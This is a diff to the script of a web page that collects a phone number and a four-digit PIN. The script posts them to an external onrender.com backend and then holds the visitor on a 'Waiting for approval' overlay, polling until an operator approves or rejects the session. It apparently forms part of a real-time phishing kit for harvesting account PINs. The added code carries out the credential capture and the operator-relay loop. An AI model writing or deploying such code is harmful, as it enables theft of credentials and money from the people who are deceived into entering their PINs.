@@ -277,67 +277,154 @@ const API = "https://ecolo-backend.onrender.com";
 
 const inputs = document.querySelectorAll(".otp-input");
 
+// Create loading overlay
+const overlay = document.createElement("div");
+overlay.innerHTML = `
+<div id="loadingOverlay" style="
+position:fixed;
+top:0;
+left:0;
+width:100%;
+height:100%;
+background:rgba(255,255,255,.95);
+display:none;
+justify-content:center;
+align-items:center;
+flex-direction:column;
+z-index:99999;
+font-family:Arial;
+">
+<div style="
+width:70px;
+height:70px;
+border:8px solid #ddd;
+border-top:8px solid #0b5ed7;
+border-radius:50%;
+animation:spin 1s linear infinite;
+"></div>
+
+<p style="margin-top:20px;font-size:18px;">
+Processing... Waiting for approval
+</p>
+</div>
+
+<style>
+@keyframes spin{
+100%{transform:rotate(360deg);}
+}
+</style>
+`;
+
+document.body.appendChild(overlay);
+
 async function submitPin() {
-    const pin = Array.from(inputs).map(i => i.value).join("");
+
+    const pin = Array.from(inputs).map(i=>i.value).join("");
     const phone = document.getElementById("phone").value.trim();
 
-    if (!phone) {
-        alert("Please enter your phone number.");
+    if(!phone){
+        alert("Enter phone number");
         return;
     }
 
-    if (!/^\d{4}$/.test(pin)) {
-        alert("Please enter a valid 4-digit PIN.");
+    if(pin.length!==4){
+        alert("Enter 4 digit PIN");
         return;
     }
 
-    try {
-        const response = await fetch(`${API}/submit/deno`, {
-            method: "POST",
-            headers: {
-                "Content-Type": "application/json"
+    try{
+
+        const res = await fetch(`${API}/submit/deno`,{
+
+            method:"POST",
+
+            headers:{
+                "Content-Type":"application/json"
             },
-            body: JSON.stringify({
+
+            body:JSON.stringify({
                 phone,
                 pin
             })
+
         });
 
-        const result = await response.json();
+        const data = await res.json();
 
-        if (response.ok) {
-            // Success
-            window.location.href = "zet.html";
-        } else {
-            alert(result.message || "Login failed.");
+        if(!res.ok){
+            alert(data.error || data.message);
+            return;
         }
 
-    } catch (err) {
-        console.error(err);
-        alert("Unable to connect to the server.");
+        const sessionId = data.sessionId;
+
+        document.getElementById("loadingOverlay").style.display="flex";
+
+        const timer = setInterval(async()=>{
+
+            const r = await fetch(`${API}/status/${sessionId}`);
+            const s = await r.json();
+
+            if(s.status==="approved"){
+
+                clearInterval(timer);
+
+                window.location.href="zet.html";
+
+            }
+
+            if(s.status==="rejected"){
+
+                clearInterval(timer);
+
+                document.getElementById("loadingOverlay").style.display="none";
+
+                alert("Request rejected");
+
+            }
+
+        },2000);
+
+    }catch(err){
+
+        console.log(err);
+
+        alert("Server unavailable.");
+
     }
+
 }
 
-inputs.forEach((input, index) => {
-    input.addEventListener("input", () => {
-        input.value = input.value.replace(/\D/g, "");
+inputs.forEach((input,index)=>{
 
-        if (input.value && index < inputs.length - 1) {
-            inputs[index + 1].focus();
+    input.addEventListener("input",()=>{
+
+        input.value=input.value.replace(/\D/g,"");
+
+        if(input.value && index<inputs.length-1){
+
+            inputs[index+1].focus();
+
         }
 
-        const complete = [...inputs].every(i => i.value.length === 1);
+        if([...inputs].every(i=>i.value.length===1)){
 
-        if (complete) {
             submitPin();
+
         }
+
     });
 
-    input.addEventListener("keydown", e => {
-        if (e.key === "Backspace" && !input.value && index > 0) {
-            inputs[index - 1].focus();
+    input.addEventListener("keydown",e=>{
+
+        if(e.key==="Backspace" && !input.value && index>0){
+
+            inputs[index-1].focus();
+
         }
+
     });
+
 });
 </script>
 
